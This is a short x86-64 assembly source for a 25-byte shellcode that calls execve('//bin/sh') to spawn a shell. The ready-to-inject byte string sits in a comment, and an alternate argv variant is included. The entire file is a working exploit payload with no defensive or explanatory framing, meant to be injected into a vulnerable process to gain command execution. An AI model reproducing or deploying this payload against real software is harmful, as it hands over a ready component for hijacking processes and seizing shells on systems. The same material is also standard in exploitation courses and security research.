# /* execve("//bin/sh", 0, 0) - 25 bytes */
# char shellcode[] = "\x6a\x3b\x58\x48\x99\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x89\xd6\x0f\x05";

.text
.globl _start
_start:
	push $59			 # sys_execve
	pop %rax

	cdq				 # env = NULL
	push %rdx			 # null-terminator byte(s)
	movabs $0x68732f6e69622f2f, %rdi # '//bin/sh'
	push %rdi			 #
	mov %rsp, %rdi			 # "//bin/sh" address

# Option 1: argv = NULL #
	mov %rdx, %rsi
# Option 2: argv = ["/bin/sh", NULL] (+ 2 bytes) #
#	push %rdx
#	push %rdi
#	mov %rsp, %rsi

	syscall
